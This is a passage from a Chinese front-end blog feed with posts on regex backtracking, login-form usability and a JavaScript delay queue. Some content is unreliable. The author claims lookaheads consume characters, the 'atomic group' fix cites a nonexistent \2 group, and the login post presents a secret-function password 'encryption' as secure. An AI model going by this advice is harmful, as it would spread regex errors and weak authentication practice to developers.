class="line"></span><br></pre></td></tr></table></figure><p>与上面不同的是，reg 中多了一个 ? 号，此时的匹配模式为懒惰模式，也叫做非贪婪匹配。此时的匹配流程是，先匹配AB，遇到[\s\S]+?，程序尝试跳过并开始匹配后面的字符B，往后查看的时候，发现是数字1，不是要匹配的内容，继续往后匹配，知道遇到字符B，然后匹配A，发现紧接着B后面就有一个A，于是宣布匹配完成，停止程序。</p><figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">  REG: /AB[\s\S]+BA/</span><br><span class="line">MATCH: <span class="keyword">A</span>               匹配第一个字符</span><br><span class="line">       AB              匹配第二个字符</span><br><span class="line">       AB              [\s\S]+? 非贪婪跳过并开始匹配B</span><br><span class="line">       AB1             不是B，回溯，继续匹配</span><br><span class="line">       AB11            不是B，回溯，继续匹配</span><br><span class="line">       AB111           不是B，回溯，继续匹配</span><br><span class="line">       AB1111          不是B，回溯，继续匹配</span><br><span class="line">       AB1111B         找到字符B，继续匹配<span class="keyword">A</span></span><br><span class="line">       AB1111BA        找到字符<span class="keyword">A</span>，匹配完成，停止匹配</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果匹配的内容是 AB1111BA，那贪婪和非贪婪方式的正则是等价的，但是内部的匹配原理还是有区别的。为了高效运用正则，必须搞清楚使用正则时会遇到那些性能消耗问题。</p><h3>三、逗比的程序</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span>去测试下这句代码</span><br><span class="line"><span class="string">&quot;TTTTTTTT&quot;</span>.match(<span class="regexp">/(T+T+)+K/</span>);</span><br><span class="line"><span class="regexp">//</span>然后把前面的T重复次数改成<span class="number">30</span></span><br><span class="line"><span class="regexp">//</span>P.S:小心风扇狂转，CPU暴涨</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们来分析下上面这段代码，上面使用的都是贪婪模式，那么他会这样做：</p><figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">  R<span class="symbol">EG:</span> (<span class="built_in">T</span>+<span class="built_in">T</span>+)+K</span><br><span class="line">MAT<span class="symbol">CH:</span> ①第一个<span class="built_in">T</span>+匹配前<span class="number">7</span>个<span class="built_in">T</span>，第二个<span class="built_in">T</span>+匹配最后一个<span class="built_in">T</span>，没找到K，宣布失败，回溯到最开始位置</span><br><span class="line">       ②第一个<span class="built_in">T</span>+匹配前<span class="number">6</span>个<span class="built_in">T</span>，第二个<span class="built_in">T</span>+匹配最后两个<span class="built_in">T</span>，没找到K，宣布失败，回溯到最开始位置</span><br><span class="line">       ③...</span><br><span class="line">       ... 接着还会考虑(<span class="built_in">T</span>+<span class="built_in">T</span>+)+后面的 + 号，接着另一轮的尝试。</span><br><span class="line">       ⑦...</span><br><span class="line">       ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这段程序并不会智能的去检测字符串中是否存在 K，如果匹配失败，他会选择其他的匹配方式（路径）去匹配，从而造成疯狂的回溯和重新匹配，结果可想而知。这是回溯失控的典型例子。</p><h3>四、前瞻和反向引用</h3><h4>1. 前瞻和引用</h4><p>前瞻有两种，一种是负向前瞻，JS中使用 <code>(?!xxx)</code> 来表示，他的作用是对后面要匹配的内容做一个预判断，如果后面的内容是xxx，则此段内容匹配失败，跳过去重新开始匹配。另一种是正向前瞻，<code>(?=xxx)</code>，匹配方式和上面相反，还有一个长的类似的是 <code>(?:xxx)</code>,这个是匹配xxx，他是非捕获性分组匹配，即匹配的内容不会创建反向引用。具体内容可以去文章开头提到的文档中查看。</p><p>反向引用，这个在 replace 中用的比较多，在 replace 中：</p><table><thead><tr><th>字符</th><th>替换文本</th></tr></thead><tbody><tr><td>$1、$2、...、$99</td><td>与 regexp 中的第 1 到第 99 个子表达式相匹配的文本。</td></tr><tr><td>$&</td><td>与 regexp 相匹配的子串。</td></tr><tr><td>$`</td><td>位于匹配子串左侧的文本。</td></tr><tr><td>$'</td><td>位于匹配子串右侧的文本。</td></tr><tr><td>$$</td><td>直接量符号。</td></tr></tbody></table><p>而在正则表达中，主要就是 \1, \2 之类的数字引用。前瞻和反向引用使用恰当可以大大的减少正则对资源的消耗。举个例子来简单说明下这几个东西：</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">问题：使用正则匹配过滤后缀名为 <span class="selector-class">.css</span> 和 <span class="selector-class">.js</span> 的文件。</span><br><span class="line">      如：test<span class="selector-class">.wow</span><span class="selector-class">.js</span> test<span class="selector-class">.wow</span><span class="selector-class">.css</span> test<span class="selector-class">.js</span>.js等等。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>有人会立马想到使用负向前瞻，即：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span>过滤js文件</span><br><span class="line"><span class="regexp">/(?!.+\.js$).*/</span>.exec(<span class="string">&quot;test.wow.js&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>过滤js和css文件</span><br><span class="line"><span class="regexp">/(?!.+\.js$|.+\.css$).*/</span>.exec(<span class="string">&quot;test.wow.js&quot;</span>)</span><br><span class="line"><span class="regexp">/(?!.+\.js$|.+\.css$).*/</span>.exec(<span class="string">&quot;test.wow.html&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是你自己去测试下，拿到的结果是什么。匹配非js和非css文件可以拿到正确的文件名，但是我们期望这个表达式对js和css文件的匹配结果是null，上面的表达式却做不到。问题是什么，因为(?!xxx)和(?=xxx)都会消耗字符，在做预判断的时候把 .js 和 .css 给消耗了，所以这里我们必须使用非捕获模式。</p><figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">/(?:(?!.+\.js$|.+\.css$).)*/.<span class="keyword">exec</span>(<span class="string">&quot;test.wow.html&quot;</span>);</span><br><span class="line">/(?:(?!.+\.js$|.+\.css$).)*/.<span class="keyword">exec</span>(<span class="string">&quot;test.wow.js&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们来分析下这个正则：</p><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">(?:(?!.+\.js$|<span class="string">.+\.css$).)*</span></span><br><span class="line"><span class="string">---   ----------------  -</span></span><br><span class="line"><span class="string"> </span>|<span class="string">                </span>|<span class="string">     </span>|</span><br><span class="line"> +----------------------+</span><br><span class="line">             ↓    |<span class="string"></span></span><br><span class="line"><span class="string">非捕获，内部只有一个占位字符</span></span><br><span class="line"><span class="string">                  </span>|</span><br><span class="line">                  ↓</span><br><span class="line">    负向前瞻以.js和.css结尾的字符串</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后一个星号是贪婪匹配，直接吞掉全部字符。</p><p>这里讲的算是有点复杂了，不过在稍复杂的正则中，这些都是很基础的东西了，想在这方面提高的童鞋可以多研究下。</p><h4>2. 原子组</h4><p>JavaScript的正则算是比较弱的，他没有分组命名、递归、原子组等功能特别强的匹配模式，不过我们可以利用一些组合方式达到自己的目的。上面的例子中，我们实际上用正则实现了一个或和与的功能，上面的例子体现的还不是特别明显，再写个例子来展示下：</p><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">&quot;我(wo)叫(jiao)李(li)靖(jing)&quot;</span>;</span><br><span class="line">str2 = <span class="string">&quot;李(li)靖(jing)我(wo)叫(jiao)&quot;</span>;</span><br><span class="line"><span class="keyword">reg</span> = /(?=.*?我)(?=.*?叫)(?=.*?李)(?=.*?靖)/;</span><br><span class="line">console.<span class="built_in">log</span>(<span class="keyword">reg</span>.<span class="keyword">test</span>(str1)); <span class="comment">//true</span></span><br><span class="line">console.<span class="built_in">log</span>(<span class="keyword">reg</span>.<span class="keyword">test</span>(str2)); <span class="comment">//true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>不管怎么打乱顺序，只要string中包含\我"，\是"，\李"，\靖"这四个字，结果都是true。</p><p>类似(?=xxx)\1，就相当于一个原子组，原子组的作用就是消除回溯，只要是这种模式匹配过的地方，回溯时都不会到这里和他之前的地方。上面的程序<code>"TTTTTTTT".match(/(T+T+)+K/);</code>可以通过原子组的方式处理：</p><figure class="highlight excel"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;TTTTTTTT&quot;</span>.<span class="built_in">match</span>(/(?=(<span class="built_in">T</span>+<span class="built_in">T</span>+))\2+K/);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如此便能彻底消除回溯失控问题。</p><h3>五、小结</h3><p>关于正则的学习，重点是要多练习多实践，并且多尝试用不同的方案去解决一个正则问题，一个很典型的例子，去除字符串首尾的空白，尝试用5-10种不同的正则去测试，并思考哪些方式的效率最高，为什么？通过这一连串的思考可以带动学习的兴趣，提高学习效率~</p><p>相关文章：<a href="https://www.barretlee.com/blog/2013/10/07/cb-javascript-regexp/">玩转正则之Highlight代码高亮</a></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> 正则 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从登录框看前端</title>
      <link href="/blog/2014/01/13/cb-user-exprience-in-login-box/"/>
      <url>/blog/2014/01/13/cb-user-exprience-in-login-box/</url>
      
        <content type="html"><![CDATA[<p>我们会骂 12306 的网站界面挫，效果差，速度慢，回头看看自己写的代码，是不是也一样的狗血！在前端，很多看似简单的东西，内藏无数玄机。本文将以一个小小的登录框为入口，谈一谈如何完善自己的程序。</p><p>在很多人眼里，前端就是 DIV+CSS+JQuery，甚至还有些人停留在 table 布局的迷雾当中（这些人应该跟 IE6 一样，随着历史渐渐被尘封）。但，前端绝不是你所看到的那样。举个例子，登录页面几乎是每一个系统不可或缺的模块，很多娴熟的人可以在一刻钟之内写好一个登录页面，两个 input，一个提交 button，万事 OK。</p><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">Username: &lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">&quot;text&quot;</span>&gt;&lt;<span class="keyword">br</span>&gt;</span><br><span class="line">Password: &lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">&quot;password&quot;</span>&gt;&lt;<span class="keyword">br</span>&gt;</span><br><span class="line">&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">&quot;sbumit&quot;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当然，作为一个完成登录验证的页面，这几个元素完全可以胜任，但我只能说你完成了一个可以用的页面，这种页面完全没有用户体验可言，完全不符合一个具有的严谨的思维的程序员的作风！</p><p>本文地址：<a href="http://www.cnblogs.com/hustskyking/p/user-exprience-in-login-box.html" target="_blank">http://www.cnblogs.com/hustskyking/p/user-exprience-in-login-box.html</a></p><h3>一、一切以良好用户体验为基础</h3><h4>1. 视觉效果</h4><p>界面的设计就不用多说了，一般情况这个属于美工的活儿，这里要谈的是几个最基础的点。</p><p>第一，你的页面兼容性如何？各个元素的长宽、行高等在不同浏览器上是否表现一致，如果这个都没有保证，那一定是不合格的。</p><p>第二，移动终端上的体验问题，如今很多页面 PC 和移动终端都用的一套结构，也就是我们所说的响应式布局，本博客就使用了响应式布局，缩小窗口可以看到效果，响应式布局是为了让不同的移动终端也能得到同样的优质体验，可是很多开发者却忽略了横屏时的效果。下面是常见的几个移动终端的像素比例：</p><table><thead><tr><th>Mobile</th><th>px rate</th></tr></thead><tbody><tr><td>Iphone5</td><td>320*568</td></tr><tr><td>Iphone4</td><td>320*480</td></tr><tr><td>Galaxy S 3/4</td><td>360*640</td></tr><tr><td>Lumia 920</td><td>384*640</td></tr><tr><td>iPad</td><td>768*1024</td></tr></tbody></table><p>照顾用户的响应式布局除了要考虑这些屏幕的横屏，还得把竖屏考虑进去。我简单的做了一个登陆页面：</p><p><img src="https://images.cnitblog.com/blog/387325/201401/131712295330.jpg" alt=""></p><p>正确的账号是：barret，密码是：123，你可以用错误的信息先去测试下~</p><p>可以戳这个DEMO：<a href="http://qianduannotes.duapp.com/demo/login/login.html" target="_blank">http://qianduannotes.duapp.com/demo/login/login.html</a></p><h4>2. 交互</h4><p>前面那种方式，点击提交按钮，送到后台去验证，验证没有通过则回到登录页面，这也算是一种交互，不过这种交互的体验是特别不好的，每次都得重新刷新页面，应该利用 ajax 异步去验证表单。为了省去用户的聚焦点击，可以按照下面的思路来做：</p><ol><li>用户名为空，或者格式不对 -》 提示错误，清空密码框，聚焦到用户名框，并全选用户名</li><li>用户名不存在 -》同上</li><li>密码错误 -》 提示错误，清空密码框，聚焦密码框</li><li>聚焦到密码框，全选密码</li></ol><p>告诉用户哪个地方出了问题，并提前预知用户遇到这些问题之后会做哪些事情，我们能够用程序解决的事情，绝不麻烦用户亲自动手操作。当提示用户名错误的时候，用户肯定会回到输入框重新输入，这个时候我们已经聚焦到用户框，并全选了之前的输入，方面用户进行删除操作。类似这样的交互，我们应该提前做预判断。</p><h4>3. 状态提示</h4><p>什么是状态提示？有时候因为网络原因，点击提交 button 之后，ajax 传输半天没有响应，用户等了半天页面一点提示都没有，这个肯定会让用户焦急的。回头看看 Gmail，一个把 ajax 发挥到极致的 web应用，在用户体验上做的也是相当给力的，登录邮箱的时候一个 loading 动画，旁边还放了一个加载基本HTML（供慢速网络使用），每一个操作都有提示，提示中还有一个撤销操作的按钮，数据进行加载的时候，如果加载时间过长，期间会进行多次不同的提示，并在最后给出一个确切的结果，对于一个登录框而言，需要做到这些：</p><ol><li>一个明确的用于状态提示的 box</li><li>等待 3s，结果没有出来，提示用户继续等待</li><li>等待 6s，结果没有出来，提示用户网络不畅通</li><li>设置 10s 为超时，并告知用户提交表单失败</li></ol><p>这些东西的实现并没有太多的技术难度，但是可以给慢速网络下的用户带来很好的体验和安全感。</p><h4>4. 安全传输</h4><p>用户最担心的是账号密码被截获，或者因为密码一处多用，不希望别人看到密码的明文，既然用户担心，我们就应该想办法来处理。</p><p>把密码和时间戳叠加，然后加密，传到后台的是加密的结果以及这个时间戳，如下：</p><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 前端</span></span><br><span class="line">t = new <span class="built_in">Date</span>();</span><br><span class="line">s = <span class="keyword">encode</span>(<span class="keyword">pwd</span> + t);</span><br><span class="line"><span class="keyword">post</span>(s, t)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 后台</span></span><br><span class="line"><span class="keyword">decode</span>(s) === <span class="keyword">pwd</span> + t</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样就可以保证密码的隐蔽性，如果 hacker 不知道 decode 函数，即便是拿到了 s 和 t，也是徒劳。关于安全传输，之前也写过相关的文章，<a href="http://www.cnblogs.com/hustskyking/p/authentication-in-web.html" target="_blank">OAuth认证原理及HTTP下的密码安全传输</a>。如果要做到在用户输入的时候就绝对安全，那就必须使用类似 支付宝安全插件 这样的东西了。他的原理就是在页面中嵌入一个控件，这个控件与页面之间是相互屏蔽的，在控件内部输入也只有控件拿得到输入信息。</p><h4>5. 数据走缓存</h4><p>表单提交首选应该是 post，但是也不排除会用 get 方式提交，那么这个时候就应该考虑数据缓存了，如果请求的 url 相同，程序就会直接从浏览器的缓存中拿数据，并给出状态是 <code>status: 200 OK(from cache)</code>，为了避免这些常识性的问题，记得在请求的参数中加点东西。</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">_t</span> = new Date*<span class="number">1</span></span><br><span class="line"><span class="attr">_n</span> = Math.random</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>为了保证参数的绝对唯一性，甚至可以把 时间戳 和随机数叠加起来用</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">_s</span> = (new Date*<span class="number">1</span> + Math.random*<span class="number">1</span>E5)/<span class="number">1</span>E5</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4>6. 渐进增强</h4><p>渐进增强这个词一般是，不支持 javascript 或者对 javascript 支持度不太好的浏览器上利用其它方式实现，或者告诉用户什么原因不能用，就是一种蜕化处理。目前不支持 javascript 的浏览器应该是绝迹了，当然也不是绝对，kindle 内置的浏览器对 javascript 的支持度就不高，或者根本就不支持。还有一种情况是用户禁用了 javascript，这个比例很小，开发者会这么干，一般的用户不会乱改浏览器设置。但是我们的程序，尤其是关键的部位（如搜索，登录，注册等）必须要考虑这一少部分群体。一般采用的方式是：</p><p>1）使用 noscript 标签，这个是最常用，也是最实用的。</p><p>2）hack 方式，document.write("&lt;" + "!--")</p><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">document.<span class="built_in">write</span>(<span class="string">&quot;&lt;&quot;</span> +=<span class="string">&quot;&quot;</span> <span class="string">&quot;!--&quot;</span>);=<span class="string">&quot;&quot;</span> code...=<span class="string">&quot;&quot;</span> 如果浏览器不支持=<span class="string">&quot;&quot;</span> javascript，将显示这中间的内容=<span class="string">&quot;&quot;</span> document.<span class="built_in">write</span>(<span class="string">&quot;--&quot;</span>=<span class="string">&quot;&quot;</span> <span class="string">&quot;=&quot;</span><span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&lt;&#x2F;“&gt;</p><p>这是一种特别巧妙的处理手段，也是值得推荐的。</p><h4>7. 浏览器后退按钮</h4><p>这个在注册或者登陆的时候是一个普遍的问题，登陆之后，跳转到另外一个页面，我的鼠标有两个侧键，是用于前进和后退的，有时候会误点侧键，这个时候页面又会回到之前的登录页面，但事实是用户已经登录了，所有页面的状态都应该是已登录的，不管什么情况下都不应该让用户在看到这个页面。用户的点击操作会引发上面的问题，而程序 <code>history.go(-1) < history.back()</code> 也会有一样的bug。</p><p>这样的问题处理方案比较简单，ajax 拿到 success 的状态码时立刻做跳转，但是这里不能用 <code>window.location.href</code>，这样浏览器还是会记录这个登录历史，应该使用 <code>window.location.replace</code>，替换当前历史记录。</p><h4>8. 记住密码</h4><p>用户最烦的就是每次登录页面都要输入长长的账号密码，如果没有勾选\记住密码"，则用户的登录状态保存在回话的 session 中，关闭页面或者浏览器的时候，回话结束，session 被删除，这样当用户下次登录的时候又需要重新输入密码。表单页面的\记住密码"复选框默认状态应该是已选择，用户的潜意识行为都是要少操作的。</p><p>当用户提交信息成功之后，直接在 cookie 中保存账号密码？这样的做法显然是不合理的，密码怎么能够明文保存呢，有人会想到加密处理密码然后再保存，或者使用服务器来设置 cookie，这些做法都是可以的，不过最好的方式是，当用户成功提交信息时，服务器给前端提供一个 token，这个 token 是用于自动登录的，我们只需要保存 token 就行了，这样就很好的避免了 cookie 中存放用户隐私信息了。</p><p>还有一个要注意的是，当用户取消了\记住密码"的复选框时，应该立即清除相关 cookie。</p><h3>二、其他相关的几个点</h3><h4>1. 用户忘记密码</h4><p>如果用户很长时间没有来你的网站，他可能会忘记自己设置的密码，一些奇葩的用户甚至会忘记自己的用户名，但是用户永远是没有错的，出错的只有我们的程序和写程序的人。对于忘记密码的人，可以在填写密码的旁边加上一个链接 \忘记密码？"，让用户利用邮箱或者绑定的手机来找到密码，对于忘记密码以及用户名的人，内伤中... <span>@undefined</span> 13# 14# 正解</p><h4>2. 脚本注入</h4><p>表单信息应该做正则匹配，或者信息的过滤，防止脚本注入，这个主要是后台要考虑的问题，就不多说了。</p><h4>3. 多次提交</h4><p>我们发微博的时候经常会遇到的问题，因为网络原因，会多次点击发布按钮，这个问题有多种处理方案：</p><ul><li>发布之前先从服务器拿 token，该 token 只有一次有效</li><li>后端判断一定时间内用户发布的多条信息，相同的信息去重</li><li>...</li></ul><h3>三、容易出错的几个知识点</h3><h4>1. setRequestHeader</h4><p>利用 ajax 来 post 信息，有的人可能遇到过，后台拿不到数据。原因是没有重写 请求头的 Content-Type，</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">xhr.<span class="keyword">open</span>(<span class="string">&quot;POST&quot;</span>, url, <span class="literal">true</span>);</span><br><span class="line">xhr.set<span class="constructor">RequestHeader(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>)</span>;</span><br><span class="line">xhr.send($.param(&#123;</span><br><span class="line">    <span class="string">&quot;user&quot;</span>:<span class="constructor">$(<span class="string">&quot;#user&quot;</span>)</span>.<span class="keyword">val</span><span class="literal">()</span>,</span><br><span class="line">    <span class="string">&quot;pwd&quot;</span>:<span class="constructor">$(<span class="string">&quot;#pwd&quot;</span>)</span>.<span class="keyword">val</span><span class="literal">()</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一般浏览器不支持 GET 方式时 xhr.send 中添加参数，但是 POST 是可以，也是必须的，如果没有设置 Content-Type 的头部，数据送到后端便没办法解析成 key-value 的模式，后台(PHP)通过 $_POST 也拿不到数据。</p><h4>2. checkbox</h4><p>这里也是一个体验问题，一些人把 checkbox 和他相关的文字分开写，结果没有使用 label 来指向，如：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;input <span class="attribute">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attribute">checked</span>=<span class="string">&quot;checked&quot;</span>&gt;记住密码</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>很显然，我们点击后面的文字是不会让 input 改变状态的，有些人会这么处理：</p><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">label</span>&gt;&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">&quot;checkbox&quot;</span> checked=<span class="string">&quot;checked&quot;</span>&gt;记住密码&lt;/<span class="keyword">label</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样处理之后，点击文字当然可以选中 input，但是这种处理方式是不合理的，label 本来就是标记 input 框用的，他的内容应该是文字，不应该包含 input 这个框，所以合理的做法应该是这样：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;input <span class="attribute">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attribute">checked</span>=<span class="string">&quot;checked&quot;</span> <span class="attribute">id</span>=<span class="string">&quot;rem&quot;</span>&gt;</span><br><span class="line">&lt;label <span class="attribute">for</span>=<span class="string">&quot;rem&quot;</span>&gt;记住密码&lt;/label&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3>四、小结</h3><p>上面说了一大堆，很多问题都是站在用户的角度去思考的，我们是程序员，但是我们也是用户，我们会吐槽，但是我们也会被吐槽。</p><p>把用户体验做到极致，这个十分重要，不要放过任何一个细节！</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript异步编程原理</title>
      <link href="/blog/2014/01/05/cb-javascript-asynchronous-programming/"/>
      <url>/blog/2014/01/05/cb-javascript-asynchronous-programming/</url>
      
        <content type="html"><![CDATA[<p>众所周知，JavaScript 的执行环境是单线程的，所谓的单线程就是一次只能完成一个任务，其任务的调度方式就是排队，这就和火车站洗手间门口的等待一样，前面的那个人没有搞定，你就只能站在后面排队等着。在事件队列中加一个延时，这样的问题便可以得到缓解。</p><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">A:</span> 嘿，哥们儿，快点！</span><br><span class="line"><span class="symbol">B:</span> 我要三分钟，你先等着，完了叫你~</span><br><span class="line"><span class="symbol">A:</span> 好的，记得叫我啊~ 你（C）也等着吧，完了叫你~</span><br><span class="line"><span class="symbol">C:</span> 嗯！</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>告诉后面排队的人一个准确的时间，这样后面的人就可以利用这段时间去干点别的事情，而不是所有的人都排在队列后抱怨。我写了一段程序来解决这个问题：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* <span class="doctag">@author</span> Barret Lee</span></span><br><span class="line"><span class="comment">* <span class="doctag">@email</span> barret.china<span class="doctag">@gmail</span>.com</span></span><br><span class="line"><span class="comment">* <span class="doctag">@description</span> 事件队列管理，含延时</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> Q = &#123;</span><br><span class="line">    <span class="comment">// 保存队列信息</span></span><br><span class="line">    <span class="attr">a</span>: [],</span><br><span class="line">    <span class="comment">// 添加到队列 queue</span></span><br><span class="line">    <span class="attr">q</span>: <span class="keyword">function</span>(<span class="params">d</span>)&#123;</span><br><span class="line">        <span class="comment">// 添加到队列如果不是函数或者数字则不处理</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="regexp">/function|number/</span>.<span class="title function_">test</span>(<span class="keyword">typeof</span> d)) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        Q.<span class="property">a</span>.<span class="title function_">push</span>(d);</span><br><span class="line">        <span class="comment">// 返回对自身的引用</span></span><br><span class="line">        <span class="keyword">return</span> Q;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 执行队列 dequeue</span></span><br><span class="line">    <span class="attr">d</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> s = Q.<span class="property">a</span>.<span class="title function_">shift</span>();</span><br><span class="line">        <span class="comment">// 如果已经到了队列尽头则返回</span></span><br><span class="line">        <span class="keyword">if</span>(!s) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果是函数，直接执行，然后继续 dequeue</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">typeof</span> s === <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_">s</span>(), Q.<span class="title function_">d</span>();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果是数字，该数字作为延迟时间，延迟 dequeue</span></span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            Q.<span class="title function_">d</span>();</span><br><span class="line">        &#125;, s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这段程序加了很多注释，相信有 JS 基础的童鞋都能够看懂，利用上面这段代码测试下：</p><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">// 进程记录函数</span><br><span class="line">function record(s)&#123;</span><br><span class="line">    var div = document.createElement(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">    div.innerHTML = s;</span><br><span class="line">    console.log(s);</span><br><span class="line">    document.body.appendChild(div);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Q</span><br><span class="line">.<span class="string">q(function()</span>&#123;</span><br><span class="line">    record(<span class="string">&quot;0 &lt;i&gt;3s 之后搞定，0 把 1 叫进来&lt;/i&gt;&quot;</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="string">q(3000)</span>  // 延时 <span class="number">3</span>s</span><br><span class="line">.<span class="string">q(function()</span>&#123;</span><br><span class="line">    record(<span class="string">&quot;1 &lt;i&gt;2s 之后搞定，1 把 2 叫进来&lt;/i&gt;&quot;</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="string">q(2000)</span>  // 延时 <span class="number">2</span>s</span><br><span class="line">.<span class="string">q(function()</span>&#123;</span><br><span class="line">    record(<span class="string">&quot;2 &lt;span&gt;后面没人了，OK，厕所关门~&lt;/span&gt;&quot;</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.d();     <span class="regexp">//</span> 执行队列</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以戳戳这个 <a href="http://qianduannotes.duapp.com/demo/ansyc/" target="_blank">DEMO</a>。也可以直接运行这段程序：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* <span class="doctag">@author</span> Barret Lee</span></span><br><span class="line"><span class="comment">* <span class="doctag">@email</span> barret.china<span class="doctag">@gmail</span>.com</span></span><br><span class="line"><span class="comment">* <span class="doctag">@description</span> 事件队列管理，含延时</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> Q = &#123;</span><br><span class="line">    <span class="comment">// 保存队列信息</span></span><br><span class="line">    <span class="attr">a</span>: [],</span><br><span class="line">    <span class="comment">// 添加到队列 queue</span></span><br><span class="line">    <span class="attr">q</span>: <span class="keyword">function</span>(<span class="params">d</span>)&#123;</span><br><span class="line">        <span class="comment">// 添加到队列如果不是函数或者数字则不处理</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="regexp">/function|number/</span>.<span class="title function_">test</span>(<span class="keyword">typeof</span> d)) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        Q.<span class="property">a</span>.<span class="title function_">push</span>(d);</span><br><span class="line">        <span class="comment">// 返回对自身的引用</span></span><br><span class="line">        <span class="keyword">return</span> Q;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 执行队列 dequeue</span></span><br><span class="line">    <span class="attr">d</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> s = Q.<span class="property">a</span>.<span class="title function_">shift</span>();</span><br><span class="line">        <span class="comment">// 如果已经到了队列尽头则返回</span></span><br><span class="line">        <span class="keyword">if</span>(!s) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果是函数，直接执行，然后继续 dequeue</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">typeof</span> s === <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_">s</span>(), Q.<span class="title function_">d</span>();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span 